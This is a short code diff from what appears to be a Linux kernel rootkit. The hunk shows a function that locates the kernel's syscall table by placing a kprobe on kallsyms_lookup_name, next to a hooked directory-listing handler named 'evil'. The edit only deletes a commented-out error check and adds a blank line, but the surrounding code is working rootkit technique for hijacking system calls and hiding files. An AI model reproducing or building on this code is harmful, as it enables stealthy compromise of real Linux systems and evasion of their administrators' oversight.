@@ -124,14 +124,11 @@ asmlinkage ssize_t evil(unsigned int fd, struct linux_dirent64 __user * dirent, 
 static void ** leak_sys_call_table(void) {
   // register the keyprobe
   int ret = register_kprobe(&kp);
-  // if (ret < 0) {
-  //   pr_err("register_kprobe failed, returned %d\n", ret);
-  //   return ret;
-  // }
   pr_info("kallsyms_lookup_name = %llx\n", kp.addr);
 
   // store the address of the kallsyms_lookup_name, which returns the address of the given symbol inside the kernel's symbol table
   kallsyms_lookup_name_pointer to_call = (kallsyms_lookup_name_pointer)kp.addr;
+  
   // call the kallsyms_lookup_name with "sys_call_table" as argument, store the address of the syscall table inside addr
   void ** addr = to_call("sys_call_table");
   return addr;
